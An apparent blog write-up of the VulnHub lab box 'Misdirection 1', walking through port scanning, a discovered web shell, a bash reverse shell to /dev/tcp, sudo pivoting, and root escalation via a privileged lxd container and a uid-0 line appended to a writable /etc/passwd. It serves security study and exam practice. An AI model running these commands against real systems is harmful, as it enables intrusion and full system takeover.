<!doctype html><html lang=en><head><title>Vulnub: Misdirection 1 ::</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/misdirection1/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/misdirection1/misdirection.png"><meta name=twitter:title content="Vulnub: Misdirection 1"><meta name=twitter:description content><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/styles.css><link rel=stylesheet href=https://blog.ikuamike.io/css/style.css><link rel="shortcut icon" href=https://blog.ikuamike.io/img/theme-colors/green.png><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/theme-colors/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnub: Misdirection 1"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/misdirection1/"><meta property="og:site_name" content><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2021-04-21 00:00:00 +0000 UTC"></head><div id=particles-js></div><body class=green><div class="container center headings--one-size" style=background:#1f222a;z-index:1><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/misdirection1/>Vulnub: Misdirection 1</a></h1><div class=post-meta><time class=post-date>2021-04-21 ::</time></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/beginner/>Beginner</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/sudo/>Sudo</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/lxd/>lxd</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/writeable-passwd/>Writeable Passwd</a>&nbsp;</span><div class=post-content><div><img src=/img/misdirection1/misdirection.png class=center style=border-radius:8px><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th></tr></thead><tbody><tr><td>Beginner</td><td>24 Sep 2019</td><td>FalconSpy</td></tr></tbody></table><h2 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h2><p>For this box, initial access was a web shell discovered. Then with low priv shell we could run bash as brexit user
and were able to pivot to that account. Once we are brexit user, we abuse his membership to the lxd to start a
privileged container that can read and write the whole file system by mounting it in the container.</p><h2 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Nmap</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.191.136
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00032s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65531</span> closed ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http    Rocket httpd 1.2.6 <span style=color:#f92672>(</span>Python 2.7.15rc1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>3306/tcp open  mysql   MySQL <span style=color:#f92672>(</span>unauthorized<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>8080/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=8080-http>8080 (HTTP)<a href=#8080-http class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Nmap</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e># Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.191.136
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00026s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>8080/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>| http-enum:
</span></span><span style=display:flex><span>|   /wordpress/: Blog
</span></span><span style=display:flex><span>|   /wordpress/wp-login.php: Wordpress login page.
</span></span><span style=display:flex><span>|   /css/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
</span></span><span style=display:flex><span>|   /debug/: Potentially interesting folder
</span></span><span style=display:flex><span>|   /development/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
</span></span><span style=display:flex><span>|   /help/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
</span></span><span style=display:flex><span>|   /images/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
</span></span><span style=display:flex><span>|   /js/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
</span></span><span style=display:flex><span>|   /manual/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
</span></span><span style=display:flex><span>|_  /scripts/: Potentially interesting directory w/ listing on <span style=color:#e6db74>&#39;apache/2.4.29 (ubuntu)&#39;</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span></code></pre></div><p>ffuf</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ffuf -ic -c -u http://192.168.191.136:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t <span style=color:#ae81ff>50</span> 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>js                      <span style=color:#f92672>[</span>Status: 301, Size: 322, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>help                    <span style=color:#f92672>[</span>Status: 301, Size: 324, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>wordpress               <span style=color:#f92672>[</span>Status: 301, Size: 329, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>manual                  <span style=color:#f92672>[</span>Status: 301, Size: 326, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>debug                   <span style=color:#f92672>[</span>Status: 301, Size: 325, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>development             <span style=color:#f92672>[</span>Status: 301, Size: 331, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>shell                   <span style=color:#f92672>[</span>Status: 301, Size: 325, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>images                  <span style=color:#f92672>[</span>Status: 301, Size: 326, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>css                     <span style=color:#f92672>[</span>Status: 301, Size: 323, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>scripts                 <span style=color:#f92672>[</span>Status: 301, Size: 327, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>server-status           <span style=color:#f92672>[</span>Status: 403, Size: 305, Words: 22, Lines: 12<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>[</span>Status: 200, Size: 10918, Words: 3499, Lines: 376<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
contains a web shell.</p><img src=/img/misdirection1/misdirection-1.png class=center style=border-radius:8px><h2 id=shell-as-www-data>Shell as www-data<a href=#shell-as-www-data class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Supplying the following command we are able to get a reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>bash -c <span style=color:#e6db74>&#39;bash -i &gt;&amp; /dev/tcp/192.168.191.1/9000 0&gt;&amp;1 &amp;&#39;</span>
</span></span></code></pre></div><p>shell:</p><img src=/img/misdirection1/misdirection-2.png class=center style=border-radius:8px><p>After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
any password requirement.</p><img src=/img/misdirection1/misdirection-3.png class=center style=border-radius:8px><h2 id=shell-as-brexit>Shell as brexit<a href=#shell-as-brexit class=hanchor arialabel=Anchor>&#8983;</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo -u brexit /bin/bash
</span></span></code></pre></div><img src=/img/misdirection1/misdirection-4.png class=center style=border-radius:8px><p>On running id we see that brexit is in the lxd group and no images are present.</p><img src=/img/misdirection1/misdirection-10.png class=center style=border-radius:8px><h2 id=shell-as-root>Shell as root<a href=#shell-as-root class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.</p><p>First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
</span></span><span style=display:flex><span>7z x distrobuilder-1.2.zip
</span></span><span style=display:flex><span>cd distrobuilder-distrobuilder-1.2 
</span></span><span style=display:flex><span>make
</span></span></code></pre></div><p>You can use go get as the repo instructions recommend but for me it didn&rsquo;t work as expected.</p><p>With distrobuilder ready, download the alpine image yaml file to build a small alpine image for lxd</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
</span></span></code></pre></div><p>Then run distrobuilder with the alpine yaml file as below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo ~/bin/distrobuilder build-lxd alpine.yaml -o image.release<span style=color:#f92672>=</span>3.8
</span></span></code></pre></div><p>This will result in two files: lxd.tar.xz and rootfs.squashfs.</p><p>We then need to transfer this two files to our victim for privesc.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e># on kali</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python3 -m http.server
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># on victim</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>wget 192.168.191.1:8000/lxd.tar.xz
</span></span><span style=display:flex><span>wget 192.168.191.1:8000/rootfs.squashfs
</span></span><span style=display:flex><span>lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
</span></span><span style=display:flex><span>lxc image list
</span></span></code></pre></div><img src=/img/misdirection1/misdirection-5.png class=center style=border-radius:8px><p>After adding the image we need to run lxd init and can keep everything default.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>lxd init
</span></span></code></pre></div><img src=/img/misdirection1/misdirection-7.png class=center style=border-radius:8px><p>Then create the container to be privileged and mount the host os file system inside it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>lxc init alpine privesc -c security.privileged<span style=color:#f92672>=</span>true
</span></span><span style=display:flex><span>lxc config device add privesc host-root disk source<span style=color:#f92672>=</span>/ path<span style=color:#f92672>=</span>/mnt/root recursive<span style=color:#f92672>=</span>true
</span></span><span style=display:flex><span>lxc start privesc
</span></span><span style=display:flex><span>lxc exec privesc /bin/sh
</span></span></code></pre></div><p>With this we can read the host file system from inside the container and can read root.txt.</p><img src=/img/misdirection1/misdirection-8.png class=center style=border-radius:8px><p>To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.</p><img src=/img/misdirection1/misdirection-9.png class=center style=border-radius:8px><h2 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h2><p>After looking at other writeups, there was another easy privesc that I didn&rsquo;t explore.</p><ul><li>Writeable /etc/passwd file</li></ul><p>The passwd file is writeable by the users in the brexit group.</p><img src=/img/misdirection1/misdirection-11.png class=center style=border-radius:8px><p>We can add user with id 0 that will give us root privileges.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>openssl passwd -1 -salt user password123
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&#39;</span> &gt;&gt;/etc/passwd
</span></span></code></pre></div><img src=/img/misdirection1/misdirection-12.png class=center style=border-radius:8px><h2 id=references>References<a href=#references class=hanchor arialabel=Anchor>&#8983;</a></h2><pre tabindex=0><code>https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/

https://www.hackingarticles.in/lxd-privilege-escalation/

https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd
</code></pre></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/sar1/><span class=button__icon>←</span>
<span class=button__text>Vulnhub: Sar 1</span></a></span>
<span class="button next"><a href=https://blog.ikuamike.io/posts/2021/lemonsqueezy1/><span class=button__text>Vulnhub: Lemon Squeezy 1</span>
<span class=button__icon>→</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2024 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div><script src=/js/vanilla-back-to-top.min.js></script>
<script>addBackToTop({diameter:40,backgroundColor:"rgb(120, 226, 160)",textColor:"#1F222A",cornerOffset:30})</script><script src=/js/particles.min.js></script>
<script>particlesJS("particles-js",{particles:{number:{value:80,density:{enable:!0,value_area:1e3}},color:{value:"#ffffff"},shape:{type:"circle",stroke:{width:0,color:"#000000"}},opacity:{value:.5,random:!1,anim:{enable:!1,speed:1,opacity_min:.1,sync:!1}},size:{value:2,random:!0,anim:{enable:!1,speed:4,size_min:.1,sync:!1}},line_linked:{enable:!0,distance:150,color:"#ffffff",opacity:.3,width:1},move:{enable:!0,speed:.5,direction:"none",random:!0,straight:!1,out_mode:"out",bounce:!1,attract:{enable:!1,rotateX:600,rotateY:1200}}},retina_detect:!0})</script></body></html>